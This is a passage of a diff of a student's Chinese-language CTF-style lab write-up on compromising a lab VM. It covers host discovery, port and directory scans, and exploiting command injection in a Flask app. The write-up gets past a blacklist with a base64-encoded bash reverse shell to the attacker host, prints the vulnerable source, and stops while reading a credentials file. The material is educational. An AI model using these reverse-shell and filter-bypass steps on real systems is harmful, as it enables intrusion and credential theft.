@@ -3392,609 +3392,608 @@
 
 <p>Network Atk&amp;Def lab7 241840273 杨良灼</p>
 <p>查询攻击机 ip</p>
-<pre><code class="language-bash">└─$ ifconfig
-eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
-        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
-        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;
-        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)
-        RX packets 1  bytes 590 (590.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 25  bytes 3214 (3.1 KiB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>ifconfig
+eth0:<span class="w"> </span><span class="nv">flags</span><span class="o">=</span><span class="m">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;<span class="w">  </span>mtu<span class="w"> </span><span class="m">1500</span>
+<span class="w">        </span>inet<span class="w"> </span><span class="m">10</span>.0.2.4<span class="w">  </span>netmask<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w">  </span>broadcast<span class="w"> </span><span class="m">10</span>.0.2.255
+<span class="w">        </span>inet6<span class="w"> </span>fe80::9d17:dec1:4341:a804<span class="w">  </span>prefixlen<span class="w"> </span><span class="m">64</span><span class="w">  </span>scopeid<span class="w"> </span>0x20&lt;link&gt;
+<span class="w">        </span>ether<span class="w"> </span><span class="m">08</span>:00:27:3c:97:80<span class="w">  </span>txqueuelen<span class="w"> </span><span class="m">1000</span><span class="w">  </span><span class="o">(</span>Ethernet<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>packets<span class="w"> </span><span class="m">1</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">590</span><span class="w"> </span><span class="o">(</span><span class="m">590</span>.0<span class="w"> </span>B<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w">  </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>frame<span class="w"> </span><span class="m">0</span>
+<span class="w">        </span>TX<span class="w"> </span>packets<span class="w"> </span><span class="m">25</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">3214</span><span class="w"> </span><span class="o">(</span><span class="m">3</span>.1<span class="w"> </span>KiB<span class="o">)</span>
+<span class="w">        </span>TX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w"> </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>carrier<span class="w"> </span><span class="m">0</span><span class="w">  </span>collisions<span class="w"> </span><span class="m">0</span>
 
-lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 8  bytes 480 (480.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 8  bytes 480 (480.0 B)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-</code></pre>
+lo:<span class="w"> </span><span class="nv">flags</span><span class="o">=</span><span class="m">73</span>&lt;UP,LOOPBACK,RUNNING&gt;<span class="w">  </span>mtu<span class="w"> </span><span class="m">65536</span>
+<span class="w">        </span>inet<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w">  </span>netmask<span class="w"> </span><span class="m">255</span>.0.0.0
+<span class="w">        </span>inet6<span class="w"> </span>::1<span class="w">  </span>prefixlen<span class="w"> </span><span class="m">128</span><span class="w">  </span>scopeid<span class="w"> </span>0x10&lt;host&gt;
+<span class="w">        </span>loop<span class="w">  </span>txqueuelen<span class="w"> </span><span class="m">1000</span><span class="w">  </span><span class="o">(</span>Local<span class="w"> </span>Loopback<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>packets<span class="w"> </span><span class="m">8</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">480</span><span class="w"> </span><span class="o">(</span><span class="m">480</span>.0<span class="w"> </span>B<span class="o">)</span>
+<span class="w">        </span>RX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w">  </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>frame<span class="w"> </span><span class="m">0</span>
+<span class="w">        </span>TX<span class="w"> </span>packets<span class="w"> </span><span class="m">8</span><span class="w">  </span>bytes<span class="w"> </span><span class="m">480</span><span class="w"> </span><span class="o">(</span><span class="m">480</span>.0<span class="w"> </span>B<span class="o">)</span>
+<span class="w">        </span>TX<span class="w"> </span>errors<span class="w"> </span><span class="m">0</span><span class="w">  </span>dropped<span class="w"> </span><span class="m">0</span><span class="w"> </span>overruns<span class="w"> </span><span class="m">0</span><span class="w">  </span>carrier<span class="w"> </span><span class="m">0</span><span class="w">  </span>collisions<span class="w"> </span><span class="m">0</span>
+</code></pre></div>
 <p>主机发现</p>
-<pre><code class="language-bash">└─$ sudo arp-scan -l
-Interface: eth0, type: EN10MB, MAC: 08:00:27:3c:97:80, IPv4: 10.0.2.4
-WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
-WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
-Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
-10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)
-10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)
-10.0.2.3        08:00:27:3d:19:c5       (Unknown)
-10.0.2.10       08:00:27:12:0c:64       (Unknown)
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>sudo<span class="w"> </span>arp-scan<span class="w"> </span>-l
+Interface:<span class="w"> </span>eth0,<span class="w"> </span>type:<span class="w"> </span>EN10MB,<span class="w"> </span>MAC:<span class="w"> </span><span class="m">08</span>:00:27:3c:97:80,<span class="w"> </span>IPv4:<span class="w"> </span><span class="m">10</span>.0.2.4
+WARNING:<span class="w"> </span>Cannot<span class="w"> </span>open<span class="w"> </span>MAC/Vendor<span class="w"> </span>file<span class="w"> </span>ieee-oui.txt:<span class="w"> </span>Permission<span class="w"> </span>denied
+WARNING:<span class="w"> </span>Cannot<span class="w"> </span>open<span class="w"> </span>MAC/Vendor<span class="w"> </span>file<span class="w"> </span>mac-vendor.txt:<span class="w"> </span>Permission<span class="w"> </span>denied
+Starting<span class="w"> </span>arp-scan<span class="w"> </span><span class="m">1</span>.10.0<span class="w"> </span>with<span class="w"> </span><span class="m">256</span><span class="w"> </span>hosts<span class="w"> </span><span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+<span class="m">10</span>.0.2.1<span class="w">        </span><span class="m">52</span>:54:00:12:35:00<span class="w">       </span><span class="o">(</span>Unknown:<span class="w"> </span>locally<span class="w"> </span>administered<span class="o">)</span>
+<span class="m">10</span>.0.2.2<span class="w">        </span><span class="m">52</span>:54:00:12:35:00<span class="w">       </span><span class="o">(</span>Unknown:<span class="w"> </span>locally<span class="w"> </span>administered<span class="o">)</span>
+<span class="m">10</span>.0.2.3<span class="w">        </span><span class="m">08</span>:00:27:3d:19:c5<span class="w">       </span><span class="o">(</span>Unknown<span class="o">)</span>
+<span class="m">10</span>.0.2.10<span class="w">       </span><span class="m">08</span>:00:27:12:0c:64<span class="w">       </span><span class="o">(</span>Unknown<span class="o">)</span>
 
-4 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned in 1.919 seconds (133.40 hosts/sec). 4 responded
-</code></pre>
+<span class="m">4</span><span class="w"> </span>packets<span class="w"> </span>received<span class="w"> </span>by<span class="w"> </span>filter,<span class="w"> </span><span class="m">0</span><span class="w"> </span>packets<span class="w"> </span>dropped<span class="w"> </span>by<span class="w"> </span>kernel
+Ending<span class="w"> </span>arp-scan<span class="w"> </span><span class="m">1</span>.10.0:<span class="w"> </span><span class="m">256</span><span class="w"> </span>hosts<span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span>.919<span class="w"> </span>seconds<span class="w"> </span><span class="o">(</span><span class="m">133</span>.40<span class="w"> </span>hosts/sec<span class="o">)</span>.<span class="w"> </span><span class="m">4</span><span class="w"> </span>responded
+</code></pre></div>
 <p>端口扫描</p>
-<pre><code class="language-bash">└─$ sudo nmap -p- 10.0.2.10
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 00:07 EST
-Nmap scan report for 10.0.2.10
-Host is up (0.00013s latency).                                                                                                                             
-Not shown: 65531 closed tcp ports (reset)                                                                                                                  
-PORT     STATE    SERVICE                                                                                                                                  
-21/tcp   open     ftp
-22/tcp   filtered ssh
-1337/tcp open     waste
-7331/tcp open     swx
-MAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.0.2.10
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-11-30<span class="w"> </span><span class="m">00</span>:07<span class="w"> </span>EST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.0.2.10
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00013s<span class="w"> </span>latency<span class="o">)</span>.<span class="w">                                                                                                                             </span>
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65531</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span><span class="w">                                                                                                                  </span>
+PORT<span class="w">     </span>STATE<span class="w">    </span>SERVICE<span class="w">                                                                                                                                  </span>
+<span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">     </span>ftp
+<span class="m">22</span>/tcp<span class="w">   </span>filtered<span class="w"> </span>ssh
+<span class="m">1337</span>/tcp<span class="w"> </span>open<span class="w">     </span>waste
+<span class="m">7331</span>/tcp<span class="w"> </span>open<span class="w">     </span>swx
+MAC<span class="w"> </span>Address:<span class="w"> </span><span class="m">08</span>:00:27:12:0C:64<span class="w"> </span><span class="o">(</span>PCS<span class="w"> </span>Systemtechnik/Oracle<span class="w"> </span>VirtualBox<span class="w"> </span>virtual<span class="w"> </span>NIC<span class="o">)</span>
 
-Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
-</code></pre>
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">2</span>.50<span class="w"> </span>seconds
+</code></pre></div>
 <p>尝试用浏览器访问各端口，只有 7331 端口有个界面</p>
 <p><img alt="8-1" src="../8-1.png" /></p>
 <p>使用 dirsearch 或 dirb 扫描什么都没扫出来，我们使用一个更大的字典去扫描：</p>
-<pre><code class="language-bash">└─$ cd /usr/share/wordlists
-└─$ ls
-└─$ sudo apt install seclists
-</code></pre>
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/usr/share/wordlists
+└─$<span class="w"> </span>ls
+└─$<span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>seclists
+</code></pre></div>
 <p>我们安装 seclists，并使用其中的字典去扫描：</p>
-<pre><code class="language-bash">└─$ dirsearch -u http://10.0.2.10:7331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
-  from pkg_resources import DistributionNotFound, VersionConflict
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://10.0.2.10:7331<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23:<span class="w"> </span>DeprecationWarning:<span class="w"> </span>pkg_resources<span class="w"> </span>is<span class="w"> </span>deprecated<span class="w"> </span>as<span class="w"> </span>an<span class="w"> </span>API.<span class="w"> </span>See<span class="w"> </span>https://setuptools.pypa.io/en/latest/pkg_resources.html
+<span class="w">  </span>from<span class="w"> </span>pkg_resources<span class="w"> </span>import<span class="w"> </span>DistributionNotFound,<span class="w"> </span>VersionConflict
 
-  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           
- (_||| _) (/_(_|| (_| )                                                                                                                                    
+<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.3<span class="w">                                                                                                                           </span>
+<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span><span class="w">                                                                                                                                    </span>
 
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545
+Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">220545</span>
 
-Output File: /home/kali/reports/http_10.0.2.10_7331/_25-11-30_00-37-41.txt
+Output<span class="w"> </span>File:<span class="w"> </span>/home/kali/reports/http_10.0.2.10_7331/_25-11-30_00-37-41.txt
 
-Target: http://10.0.2.10:7331/
+Target:<span class="w"> </span>http://10.0.2.10:7331/
 
-[00:37:41] Starting:                                                                                                                                       
-[00:38:29] 200 -  385B  - /wish                                             
-[00:39:45] 200 -    2KB - /genie                                            
+<span class="o">[</span><span class="m">00</span>:37:41<span class="o">]</span><span class="w"> </span>Starting:<span class="w">                                                                                                                                       </span>
+<span class="o">[</span><span class="m">00</span>:38:29<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>385B<span class="w">  </span>-<span class="w"> </span>/wish<span class="w">                                             </span>
+<span class="o">[</span><span class="m">00</span>:39:45<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>2KB<span class="w"> </span>-<span class="w"> </span>/genie<span class="w">                                            </span>
 
-Task Completed    
-</code></pre>
+Task<span class="w"> </span>Completed<span class="w">    </span>
+</code></pre></div>
 <p>搜到了两个目录，浏览器尝试打开 <code>http://10.0.2.10:7331/wish</code> 和 <code>http://10.0.2.10:7331/genie</code>.</p>
 <p><img alt="8-2" src="../8-2.png" /></p>
 <p><img alt="8-3" src="../8-3.png" /></p>
 <p>根据 wish 页面的提示，我们输入随便什么指令，发现都会跳转到 genie 页面，但是导航栏给出的信息不同：</p>
-<pre><code class="language-bash">&gt; whoami
-&lt; http://10.0.2.10:7331/genie?name=www-data%0A
-&gt; pwd
-&lt; http://10.0.2.10:7331/genie?name=%2Fopt%2F80%0A
-&gt; id
-&lt; http://10.0.2.10:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
-&gt; whereis bash
-&lt; http://10.0.2.10:7331/genie?name=bash%3A+%2Fbin%2Fbash+%2Fetc%2Fbash.bashrc+%2Fusr%2Fshare%2Fman%2Fman1%2Fbash.1.gz%0A
-&gt; cat /etc/passwd
-&lt; http://10.0.2.10:7331/genie?name=Wrong+choice+of+words
-</code></pre>
+<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>whoami
+&lt;<span class="w"> </span>http://10.0.2.10:7331/genie?name<span class="o">=</span>www-data%0A
+&gt;<span class="w"> </span><span class="nb">pwd</span>
+&lt;<span class="w"> </span>http://10.0.2.10:7331/genie?name<span class="o">=</span>%2Fopt%2F80%0A
+&gt;<span class="w"> </span>id
+&lt;<span class="w"> </span>http://10.0.2.10:7331/genie?name<span class="o">=</span>uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
+&gt;<span class="w"> </span>whereis<span class="w"> </span>bash
+&lt;<span class="w"> </span>http://10.0.2.10:7331/genie?name<span class="o">=</span>bash%3A+%2Fbin%2Fbash+%2Fetc%2Fbash.bashrc+%2Fusr%2Fshare%2Fman%2Fman1%2Fbash.1.gz%0A
+&gt;<span class="w"> </span>cat<span class="w"> </span>/etc/passwd
+&lt;<span class="w"> </span>http://10.0.2.10:7331/genie?name<span class="o">=</span>Wrong+choice+of+words
+</code></pre></div>
 <p>我们还可以输入一些其他命令，我们发现大多命令都会返回一些东西，但是有些命令则返回 Wrong choice of words. 如果我们直接尝试使用反弹 shell，也会返回这个，这表明命令很可能存在黑名单过滤机制，并且阻止我们利用反弹 shell 套取权限。</p>
 <p>我们采用可逆的 base64 加密绕过明文过滤，之后再解码执行：先监听比如 3343 端口：</p>
-<pre><code class="language-bash">└─$ nc -nlvp 3343
-listening on [any] 3343 ...
-</code></pre>
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">3343</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">3343</span><span class="w"> </span>...
+</code></pre></div>
 <p>将反弹 shell 命令加密（这个可以使用 burp suite 的 decoder 界面完成）：</p>
-<pre><code class="language-bash">&gt; bash -i &gt;&amp; /dev/tcp/10.0.2.4/3343 0&gt;&amp;1
-&lt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE=
-</code></pre>
+<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.0.2.4/3343<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+&lt;<span class="w"> </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE<span class="o">=</span>
+</code></pre></div>
 <p>利用管道符搞出这个指令：</p>
-<pre><code class="language-bash">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE= | base64 -d | bash
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE<span class="o">=</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+</code></pre></div>
 <p>反弹 shell 成功：</p>
 <p><img alt="8-4" src="../8-4.png" /></p>
 <p>看下有什么：</p>
-<pre><code class="language-bash">www-data@box7:/opt/80$ ls -l      
-ls -l
-total 16
--rw-r--r-- 1 www-data www-data 1323 Nov 13  2019 app.py
--rw-r--r-- 1 www-data www-data 1846 Nov 14  2019 app.pyc
-drwxr-xr-x 5 www-data www-data 4096 Nov 13  2019 static
-drwxr-xr-x 2 www-data www-data 4096 Nov 14  2019 templates
-</code></pre>
+<div class="highlight"><pre><span></span><code>www-data@box7:/opt/80$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w">      </span>
+ls<span class="w"> </span>-l
+total<span class="w"> </span><span class="m">16</span>
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w"> </span><span class="m">1323</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">13</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>app.py
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w"> </span><span class="m">1846</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>app.pyc
+drwxr-xr-x<span class="w"> </span><span class="m">5</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">13</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>static
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>templates
+</code></pre></div>
 <p>然后我们 <code>cat app.py</code> 看一看</p>
-<pre><code class="language-python">import subprocess
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
 
-from flask import Flask, redirect, render_template, request, url_for
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">url_for</span>
 
-app = Flask(__name__)
-app.secret_key = &quot;key&quot;
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s2">&quot;key&quot;</span>
 
-CREDS = &quot;/home/nitish/.dev/creds.txt&quot;
+<span class="n">CREDS</span> <span class="o">=</span> <span class="s2">&quot;/home/nitish/.dev/creds.txt&quot;</span>
 
-RCE = [&quot;/&quot;, &quot;.&quot;, &quot;?&quot;, &quot;*&quot;, &quot;^&quot;, &quot;$&quot;, &quot;eval&quot;, &quot;;&quot;]
-
-
-def validate(cmd):
-    if CREDS in cmd and &quot;cat&quot; not in cmd:
-        return True
-
-    try:
-        for i in RCE:
-            for j in cmd:
-                if i == j:
-                    return False
-        return True
-    except Exception:
-        return False
+<span class="n">RCE</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="s2">&quot;?&quot;</span><span class="p">,</span> <span class="s2">&quot;*&quot;</span><span class="p">,</span> <span class="s2">&quot;^&quot;</span><span class="p">,</span> <span class="s2">&quot;$&quot;</span><span class="p">,</span> <span class="s2">&quot;eval&quot;</span><span class="p">,</span> <span class="s2">&quot;;&quot;</span><span class="p">]</span>
 
 
-@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
-def index():
-    return render_template(&quot;main.html&quot;)
+<span class="k">def</span><span class="w"> </span><span class="nf">validate</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">CREDS</span> <span class="ow">in</span> <span class="n">cmd</span> <span class="ow">and</span> <span class="s2">&quot;cat&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">True</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">RCE</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">j</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="kc">False</span>
+        <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
 
 
-@app.route(&quot;/wish&quot;, methods=['POST', &quot;GET&quot;])
-def wish():
-    execute = request.form.get(&quot;cmd&quot;)
-    if execute:
-        if validate(execute):
-            output = subprocess.Popen(execute, shell=True,
-                                      stdout=subprocess.PIPE).stdout.read()
-        else:
-            output = &quot;Wrong choice of words&quot;
-
-        return redirect(url_for(&quot;genie&quot;, name=output))
-    else:
-        return render_template('wish.html')
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;main.html&quot;</span><span class="p">)</span>
 
 
-@app.route('/genie', methods=['GET', 'POST'])
-def genie():
-    if 'name' in request.args:
-        page = request.args.get('name')
-    else:
-        page = &quot;It's not that hard&quot;
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/wish&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s2">&quot;GET&quot;</span><span class="p">])</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">wish</span><span class="p">():</span>
+    <span class="n">execute</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">execute</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">validate</span><span class="p">(</span><span class="n">execute</span><span class="p">):</span>
+            <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">execute</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+                                      <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">output</span> <span class="o">=</span> <span class="s2">&quot;Wrong choice of words&quot;</span>
 
-    return render_template('genie.html', file=page)
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&quot;genie&quot;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">output</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;wish.html&#39;</span><span class="p">)</span>
 
 
-if __name__ == &quot;__main__&quot;:
-    app.run(host='0.0.0.0', debug=True)
-</code></pre>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/genie&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">genie</span><span class="p">():</span>
+    <span class="k">if</span> <span class="s1">&#39;name&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">:</span>
+        <span class="n">page</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">page</span> <span class="o">=</span> <span class="s2">&quot;It&#39;s not that hard&quot;</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;genie.html&#39;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">page</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></div>
 <p>我们看到这段代码中有 <code>CREDS</code> 信息，是个目录，有个 <code>RCE</code> 列表和 <code>validate()</code> 函数，还有个 <code>wish()</code> 函数，其中有 <code>Wrong choice of words</code>，表明这就是 wish 页面的后端代码。</p>
 <p>我们看看 <code>CREDS</code> 目录中的内容：</p>
-<pre><code class="language-bash">www-data@box7:/opt/80$ cat /home/nitish/.dev/creds.txt
-cat /home/nitish/.dev/creds.txt
+<div class="highlight"><pre><span></span><code>www-data@box7:/opt/80$<span class="w"> </span>cat<span class="w"> </span>/home/nitish/.dev/creds.txt
+cat<span class="w"> </span>/home/nitish/.dev/creds.txt
